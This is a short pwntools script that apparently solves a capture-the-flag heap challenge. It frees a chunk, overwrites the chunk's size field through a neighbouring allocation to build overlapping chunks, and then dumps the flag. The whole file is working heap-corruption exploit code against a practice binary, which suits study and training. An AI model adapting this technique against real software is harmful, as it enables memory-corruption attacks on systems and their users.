from pwn import * 

binary = './babyheap_level19.0_patched'
p = process(binary)

# Allocate chunk 0 (we'll use this to corrupt metadata)
p.sendline("malloc 0 24")

# Allocate chunk 1 (the one we'll free and corrupt)
p.sendline("malloc 1 120")  # Different size to try

# Allocate chunk 2 (to prevent consolidation)
p.sendline("malloc 2 24")

# Free chunk 1
p.sendline("free 1")

# Corrupt the size field of chunk 1
p.sendline("safe_read 0")
# The size of chunk 1 is 0x81 (128 bytes + 8 byte header)
# We'll make it much larger to ensure overlap
p.sendline(b'A' * 0x10 + p64(0) + p64(0x501))  # Much larger size

# Read flag
p.sendline("read_flag")

# Re-allocate chunk 1
p.sendline("malloc 1 120")

# Allocate chunk 3 that should overlap with the flag
p.sendline("malloc 3 400")  # Size big enough to reach the flag

# View the contents
p.sendline("safe_write 3")

p.interactive()
